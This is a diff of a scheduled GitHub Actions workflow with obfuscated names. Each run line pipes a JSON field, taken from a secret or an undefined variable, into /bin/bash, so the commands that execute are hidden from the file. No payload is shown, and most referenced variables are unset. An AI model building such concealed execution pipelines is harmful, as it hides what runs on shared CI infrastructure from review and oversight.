@@ -1,27 +1,25 @@
 name: jixiaxingliang
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '7 3/6 * * *'
+    - cron: '21 3/6 * * *'
 
 jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: jixiaxingliang
         env:
-          vmavu034: ${{ secrets.vmavu034 }}
+          bqnm4252: ${{ secrets.bqnm4252 }}
         run: |
-          echo $vmavu034 | jq -r .upf7 | /bin/bash
-          echo $qhv19 | jq -r .kqnj7403 | /bin/bash
-          echo $fgl13 | jq -r .zvk30166 | /bin/bash
-          echo $wpza499 | jq -r .iede6 | /bin/bash
-          echo $m8758 | jq -r .wzd0889 | /bin/bash
-          echo $iui36 | jq -r .l1968 | /bin/bash
-          echo $th1869 | jq -r .ms537 | /bin/bash
-          echo $jvih0831 | jq -r .smuxk97521 | /bin/bash
-          echo $oxlm6 | jq -r .uigk2 | /bin/bash
-          echo $qsy8097 | jq -r .b56 | /bin/bash
-          echo $twz27072 | jq -r .nsj95158 | /bin/bash
+          echo $bqnm4252 | jq -r .heafp04043 | /bin/bash
+          echo $kpni4654 | jq -r .zida53 | /bin/bash
+          echo $j66 | jq -r .y132 | /bin/bash
+          echo $csm97 | jq -r .xhnqh6 | /bin/bash
+          echo $zv54 | jq -r .zq8290 | /bin/bash
+          echo $sqxpv3 | jq -r .v3 | /bin/bash
+          echo $yqvjy67020 | jq -r .yuof2393 | /bin/bash
 
